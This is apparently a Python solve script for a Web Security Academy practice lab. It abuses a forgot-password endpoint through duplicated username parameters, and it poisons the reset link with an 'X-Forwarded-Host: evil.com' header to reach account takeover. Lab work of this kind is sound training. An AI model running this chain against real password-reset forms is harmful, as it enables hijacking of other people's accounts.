#!/usr/bin/env python3
import requests

url = "https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net/forgot-password"
session = "34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL"

headers = {
    "Cookie": f"session={session}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept": "*/*"
}

print("Testing Parameter Pollution - Clean Request")
print("=" * 50)

# Test the basic pollution that worked before
payload = "csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&username=carlos"

try:
    response = requests.post(url, data=payload, headers=headers, verify=False)
    result = response.text

    print(f"Payload: {payload}")
    print(f"Response: {result}")
    print(f"Status: {response.status_code}")

    if "carlos-montoya.net" in result:
        print("\n✓ SUCCESS: Parameter pollution confirmed!")
        print("- Requesting reset for 'administrator'")
        print("- Backend processes 'carlos' instead")
        print("- This is Server-Side Parameter Pollution!")

except Exception as e:
    print(f"Error: {e}")

# Now test if we can abuse this for Host Header Injection
print("\n" + "=" * 50)
print("Testing Parameter Pollution + Host Header Injection")

# Try to combine parameter pollution with host header attack
payload_with_host = "csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=administrator&username=carlos"
headers_with_host = {
    **headers,
    "X-Forwarded-Host": "evil.com"
}

try:
    response = requests.post(url, data=payload_with_host, headers=headers_with_host, verify=False)
    result = response.text

    print(f"Payload: {payload_with_host}")
    print(f"Headers: X-Forwarded-Host: evil.com")
    print(f"Response: {result}")

    if "evil.com" in result:
        print("\n🚨 CRITICAL: Combined vulnerability!")
        print("- Parameter pollution bypasses frontend validation")
        print("- Host header injection poisons the reset URL")
        print("- Perfect for account takeover!")

except Exception as e:
    print(f"Error: {e}")

# Test what happens if we reverse the usernames
print("\n" + "=" * 50)
print("Testing Reversed Parameter Order")

payload_reversed = "csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos&username=administrator"

try:
    response = requests.post(url, data=payload_reversed, headers=headers, verify=False)
    result = response.text

    print(f"Payload: {payload_reversed}")
    print(f"Response: {result}")

    if "normal-user.net" in result:
        print("\n✓ Reversed order works - targets administrator!")

except Exception as e:
    print(f"Error: {e}")

print("\nSUMMARY:")
print("1. Server-Side Parameter Pollution exists")
print("2. Last parameter value takes precedence")
print("3. Can bypass frontend validation")
print("4. Combined with Host Header Injection = Account Takeover")